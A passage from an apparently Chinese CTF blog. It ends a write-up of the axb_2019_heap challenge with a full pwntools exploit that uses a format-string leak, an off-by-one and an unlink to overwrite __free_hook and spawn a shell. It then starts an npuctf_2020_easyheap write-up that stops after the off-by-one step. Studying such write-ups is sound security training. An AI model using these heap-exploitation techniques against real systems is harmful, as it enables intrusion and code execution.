<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x55830ca49060</span><br><span class="line">0x55830ca49060 &lt;note&gt;:	0x000055830d656010	0x0000000000000098</span><br><span class="line">0x55830ca49070 &lt;note+16&gt;:	0x000055830d6560b0	0x0000000000000098</span><br><span class="line">0x55830ca49080 &lt;note+32&gt;:	0x000055830d656150	0x0000000000000098</span><br><span class="line">0x55830ca49090 &lt;note+48&gt;:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(0,0x98,&#39;aaaa&#39;)</span><br><span class="line">add(1,0x98,&#39;bbbb&#39;)</span><br><span class="line">add(2,0x98,&#39;cccc&#39;)</span><br></pre></td></tr></table></figure>
<blockquote>
<p> 通过第一个chunk构造，并off by one修改第二个chunk的大小。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55d2cb54e000</span><br><span class="line">Size: 0xa1</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x55d2cb54e0a0</span><br><span class="line">Size: 0xa0			#修改标志位，表示上一个chunk被释放</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55d2cb54e140</span><br><span class="line">Size: 0xa1</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55d2cb54e1e0</span><br><span class="line">Size: 0x20e21</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x55d2cb54e000</span><br><span class="line">0x55d2cb54e000:	0x0000000000000000	0x00000000000000a1	#第一个chunk</span><br><span class="line">0x55d2cb54e010:	0x0000000000000000	0x0000000000000090	#fake chunk</span><br><span class="line">0x55d2cb54e020:	0x000055d2cb00d048	0x000055d2cb00d050	#fd、bk</span><br><span class="line">0x55d2cb54e030:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55d2cb54e040:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55d2cb54e050:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55d2cb54e060:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55d2cb54e070:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55d2cb54e080:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55d2cb54e090:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55d2cb54e0a0:	0x0000000000000090	0x00000000000000a0	#pre_size &#x3D; 0x90,size &#x3D; 0xa0</span><br><span class="line">0x55d2cb54e0b0:	0x0000000062626262	0x0000000000000000</span><br><span class="line">0x55d2cb54e0c0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">note &#x3D; pro_base + 0x0202060</span><br><span class="line">payload &#x3D; p64(0) + p64(0x90)</span><br><span class="line">payload +&#x3D; p64(fd) + p64(bk)</span><br><span class="line">payload +&#x3D; &#39;a&#39; * 0x70</span><br><span class="line">payload +&#x3D; p64(0x90) + p8(0xa0)</span><br><span class="line">print(hex(len(payload)))</span><br><span class="line">edit(0,payload)</span><br><span class="line">print(hex(note))</span><br></pre></td></tr></table></figure>
<blockquote>
<p>释放第二个chunk，造成unlink，target = target - 0x18</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#没变化</span><br><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55682bfdf000</span><br><span class="line">Size: 0xa1</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x55682bfdf0a0</span><br><span class="line">Size: 0xa0</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x55682bfdf140</span><br><span class="line">Size: 0xa0</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55682bfdf1e0</span><br><span class="line">Size: 0x20e21</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x55682bfdf000</span><br><span class="line">0x55682bfdf000:	0x0000000000000000	0x00000000000000a1</span><br><span class="line">0x55682bfdf010:	0x0000000000000000	0x0000000000000131	#合并了，大小为0x90 + 0xa0</span><br><span class="line">0x55682bfdf020:	0x00007fea30ac5b78	0x00007fea30ac5b78</span><br><span class="line">0x55682bfdf030:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55682bfdf040:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55682bfdf050:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55682bfdf060:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55682bfdf070:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55682bfdf080:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55682bfdf090:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55682bfdf0a0:	0x0000000000000090	0x00000000000000a0</span><br><span class="line">0x55682bfdf0b0:	0x0000000062626262	0x0000000000000000</span><br><span class="line">0x55682bfdf0c0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x55682b44c060</span><br><span class="line">0x55682b44c060 &lt;note&gt;:	0x000055682b44c048	0x0000000000000098#target &#x3D; target - 0x18</span><br><span class="line">0x55682b44c070 &lt;note+16&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55682b44c080 &lt;note+32&gt;:	0x000055682bfdf150	0x0000000000000098</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dele(1)</span><br></pre></td></tr></table></figure>
<h4 id="3-修改-free-hook为system"><a href="#3-修改-free-hook为system" class="headerlink" title="3.修改__free_hook为system"></a>3.修改__free_hook为system</h4><blockquote>
<p>通过第一个chunk，覆盖第一个chunk的指针指向__free_hook的地址</p>
<p>设置第二个chunk为参数“/bin/sh\x00”，只要让chunk2指向后面的地址，在上面的地址布置上字符串即可。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x55cbe5291060</span><br><span class="line">0x55cbe5291060 &lt;note&gt;:	0x00007f962216f7a8	0x0000000000000098		#__free_hook地址</span><br><span class="line">0x55cbe5291070 &lt;note+16&gt;:	0x000055cbe5291078	0x0068732f6e69622f	#binsh地址 binsh字符串</span><br><span class="line">0x55cbe5291080 &lt;note+32&gt;:	0x000055cbe5975100	0x0000000000000098</span><br><span class="line">0x55cbe5291090 &lt;note+48&gt;:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x00007f962216f7a8</span><br><span class="line">0x7f962216f7a8 &lt;__free_hook&gt;:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">system &#x3D; libc_base + libc.sym[&#39;system&#39;]</span><br><span class="line">free_hook &#x3D; libc_base + libc.sym[&#39;__free_hook&#39;]</span><br><span class="line">payload &#x3D; p64(0) * 3</span><br><span class="line">payload +&#x3D; p64(free_hook) + p64(0x98)</span><br><span class="line">payload +&#x3D; p64(note + 24) +&quot;&#x2F;bin&#x2F;sh\x00&quot;</span><br><span class="line">edit(0,payload)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>第一个chunk指向<code>__free_hook</code>，往chunk1填入数据就是往<code>__free_hook</code>填入数据，修改其为system地址。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x5578fc638060</span><br><span class="line">0x5578fc638060 &lt;note&gt;:	0x00007f909293e7a8	0x0000000000000098</span><br><span class="line">0x5578fc638070 &lt;note+16&gt;:	0x00005578fc638078	0x0068732f6e69622f</span><br><span class="line">0x5578fc638080 &lt;note+32&gt;:	0x00005578fd63e100	0x0000000000000098</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x00007f909293e7a8</span><br><span class="line">0x7f909293e7a8 &lt;__free_hook&gt;:	0x00007f90925bd3a0</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x00007f90925bd3a0</span><br><span class="line">0x7f90925bd3a0 &lt;__libc_system&gt;:	0xfa86e90b74ff8548</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit(0,p64(system))</span><br></pre></td></tr></table></figure>
<blockquote>
<p>最后，释放第二个chunk即可执行free(2) =&gt; system(“/bin/sh\x00”)</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dele(1)</span><br></pre></td></tr></table></figure>
<h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./axb_2019_heap"</span>)</span><br><span class="line"><span class="comment"># p=remote("node3.buuoj.cn",28733)</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">elf = ELF(<span class="string">"./axb_2019_heap"</span>)</span><br><span class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc-2.23.so"</span>)</span><br><span class="line"><span class="comment"># libc = ELF("./libc-2.23.so")</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(choice)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">	p.sendline(str(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">	cmd(<span class="number">1</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"to create (0-10):"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">"Enter a size:"</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">"Enter the content:"</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(idx)</span>:</span></span><br><span class="line">	cmd(<span class="number">2</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Enter an index:"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">	cmd(<span class="number">4</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Enter an index:"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">"Enter the content: "</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Enter your name: "</span>)</span><br><span class="line">payload = <span class="string">"%15$p.%19$p"</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">main_240 = int(p.recvuntil(<span class="string">"."</span>)[<span class="number">-13</span>:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line">push_rbp = int(p.recvuntil(<span class="string">"\n"</span>)[<span class="number">-13</span>:],<span class="number">16</span>)</span><br><span class="line">print(hex(main_240))</span><br><span class="line">print(hex(push_rbp))</span><br><span class="line"></span><br><span class="line">libc_base = main_240 - libc.sym[<span class="string">'__libc_start_main'</span>] - <span class="number">240</span></span><br><span class="line">pro_base = push_rbp - <span class="number">0x116a</span></span><br><span class="line">log.success(hex(libc_base))</span><br><span class="line">log.success(hex(pro_base))</span><br><span class="line"></span><br><span class="line">system = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">note = pro_base + <span class="number">0x0202060</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x98</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x98</span>,<span class="string">'bbbb'</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x98</span>,<span class="string">'cccc'</span>)</span><br><span class="line">print(hex(note))</span><br><span class="line"></span><br><span class="line">fd = note - <span class="number">0x18</span></span><br><span class="line">bk = note - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">payload += p64(fd) + p64(bk)</span><br><span class="line">payload += <span class="string">'a'</span> * <span class="number">0x70</span></span><br><span class="line">payload += p64(<span class="number">0x90</span>) + p8(<span class="number">0xa0</span>)</span><br><span class="line">print(hex(len(payload)))</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">print(hex(note))</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">payload += p64(free_hook) + p64(<span class="number">0x98</span>)</span><br><span class="line">payload += p64(note + <span class="number">24</span>) +<span class="string">"/bin/sh\x00"</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(system))</span><br><span class="line"></span><br><span class="line">print(hex(note))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<blockquote>
<p>组合拳，题型：fmt + off by one + unlink</p>
</blockquote>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/04/25/00-17/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/shuwen.jpg">
      <meta itemprop="name" content="Shuwen">
      <meta itemprop="description" content="做有意思的事，有意思地做事">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Shuwen's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/04/25/00-17/" class="post-title-link" itemprop="url">npuctf_2020_easyheap详解</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-04-25 00:17:07 / 修改时间：00:18:13" itemprop="dateCreated datePublished" datetime="2021-04-25T00:17:07+08:00">2021-04-25</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/buu/" itemprop="url" rel="index"><span itemprop="name">buu</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <blockquote>
<p>off by one的题，，，</p>
<p>参考视频：<a href="https://www.bilibili.com/video/BV19K4y1v7tq?from=search&amp;seid=15178314990352817331" target="_blank" rel="noopener">off by one + 改got表的heap做法 例题：npuctf_2020_easyheap</a></p>
</blockquote>
<h3 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h3><ol>
<li><p>create：</p>
<p>申请两个chunk： 一个heaparray[i]（固定0x10大小），一个是申请的大小（只能申请0x18或0x38）</p>
</li>
<li><p>edit：</p>
<p><code>read_input(heaparray[(signed int)v1][1], *heaparray[(signed int)v1] + 1LL);</code></p>
<p>存在off by one</p>
</li>
<li><p>show：根据idx，打印chunk大小和内容</p>
</li>
<li><p>delete：free后，将chunk指针置零了。</p>
</li>
</ol>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>利用off by one，可以修改下一个chunk头指针的大小。</p>
<p>例如，一开始可以申请两个0x18的块。当修改chunk0，溢出到chunk1的头指针大小为0x41，那么chunk1free后重新申请回来，chunk1的内容会和chunk1头指针重叠，可以修改chunk1的指针。</p>
<p>溢出修改chunk1指针为free_got表，泄露地址，计算system</p>
<p>修改chunk内容从而，修改got表内容为system</p>
<p>在chunk0中放入“/bin/sh\x00”，则free(0)即可=&gt;system(“/bin/sh\x00”)</p>
<h4 id="1-查看保护"><a href="#1-查看保护" class="headerlink" title="1.查看保护"></a>1.查看保护</h4><blockquote>
<p>Partial RELRO =&gt; 可以修改got表</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">winter@ubuntu:~&#x2F;buu$ checksec npuctf_2020_easyheap</span><br><span class="line">[*] &#39;&#x2F;home&#x2F;winter&#x2F;buu&#x2F;npuctf_2020_easyheap&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<h4 id="2-申请两个0x18的块"><a href="#2-申请两个0x18的块" class="headerlink" title="2.申请两个0x18的块"></a>2.申请两个0x18的块</h4><blockquote>
<p>一共生成了四个chunk，两个heaparray，两个存在内容</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x1560000</span><br><span class="line">Size: 0x251</span><br><span class="line"></span><br><span class="line">#chunk0 heaparray</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x1560250</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">#chunk0 data</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x1560270</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">#chunk1 heaparray</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x1560290</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">#chunk1 data</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x15602b0</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x15602d0</span><br><span class="line">Size: 0x20d31</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x1560250</span><br><span class="line">0x1560250:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x1560260:	0x0000000000000018	0x0000000001560280</span><br><span class="line">0x1560270:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x1560280:	0x0000000a61616161	0x0000000000000000</span><br><span class="line">0x1560290:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x15602a0:	0x0000000000000018	0x00000000015602c0</span><br><span class="line">0x15602b0:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x15602c0:	0x0000000a61616161	0x0000000000000000</span><br><span class="line">0x15602d0:	0x0000000000000000	0x0000000000020d31</span><br><span class="line">0x15602e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x15602f0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<h4 id="3-通过chunk0-off-by-one"><a href="#3-通过chunk0-off-by-one" class="headerlink" title="3.通过chunk0 off by one"></a>3.通过chunk0 off by one</h4><blockquote>
<p>修改chunk0的内容，首先放入接下来用的参数。</p>
<p>然后溢出一个字节，修改chunk1 heaparray的大小为0x41</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x1327000</span><br><span class="line">Size: 0x251</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x1327250</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x1327270</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x1327290</span><br><span class="line">Size: 0x41</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x13272d0</span><br><span class="line">Size: 0x20d31</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x1327250</span><br><span class="line">0x1327250:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x1327260:	0x0000000000000018	0x0000000001327280</span><br><span class="line">0x1327270:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x1327280:	0x0068732f6e69622f	0x0000000000000000	#&quot;&#x2F;bin&#x2F;sh\x00&quot;</span><br><span class="line">0x1327290:	0x0000000000000000	0x0000000000000041	#溢出一个字节</span><br><span class="line">0x13272a0:	0x0000000000000018	0x00000000013272c0</span><br><span class="line">0x13272b0:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x13272c0:	0x0000000a61616161	0x0000000000000000</span><br><span class="line">0x13272d0:	0x0000000000000000	0x0000000000020d31</span><br><span class="line">0x13272e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x13272f0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>存放所有的heaparay指针，有两个</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x6020a0</span><br><span class="line">0x6020a0 &lt;heaparray&gt;:	0x0000000000bf0260	0x0000000000bf02c0</span><br><span class="line">0x6020b0 &lt;heaparray+16&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6020c0 &lt;heaparray+32&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6020d0 &lt;heaparray+48&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6020e0 &lt;heaparray+64&gt;:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
